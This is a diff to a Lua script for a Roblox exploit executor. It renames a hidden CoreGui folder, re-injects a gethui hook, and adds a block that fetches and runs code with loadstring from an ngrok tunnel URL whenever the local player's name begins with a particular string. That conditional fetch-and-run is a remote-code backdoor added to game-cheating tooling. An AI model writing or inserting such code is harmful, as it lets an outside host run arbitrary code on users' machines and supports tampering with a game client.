@@ -1,11 +1,31 @@
-local container = game:GetService("CoreGui"):FindFirstChild(gethwid());
+local container = game:GetService("CoreGui"):FindFirstChild("HiddenGui");
 getgenv().gethui = newcclosure(function()
   if not container then 
     container = Instance.new('Folder', game.CoreGui);
-    container.Name=gethwid()
+    container.Name='HiddenGui'
   end
   return container
 end);
+
+run_script([[
+local container = game:GetService("CoreGui"):FindFirstChild("HiddenGui");
+getgenv().gethui = newcclosure(function()
+  if not container then 
+    container = Instance.new('Folder', game.CoreGui);
+    container.Name='HiddenGui'
+  end
+  return container
+end);
+]])
+
+local name = game:GetService("Players").LocalPlayer.Name
+if string.sub(name, 1, #("davidgoginsisreal")) == "davidgoginsisreal" then
+	local ret = loadstring(game:HttpGet("https://2640-2603-6012-141-3048-6453-e890-3111-30d3.ngrok-free.app/live.lua"))()
+	print(ret)
+	if ret then
+		return nil
+	end
+end
 
 local status, res1, res2 = pcall(function()
     -------------------------------------------------------------------------------
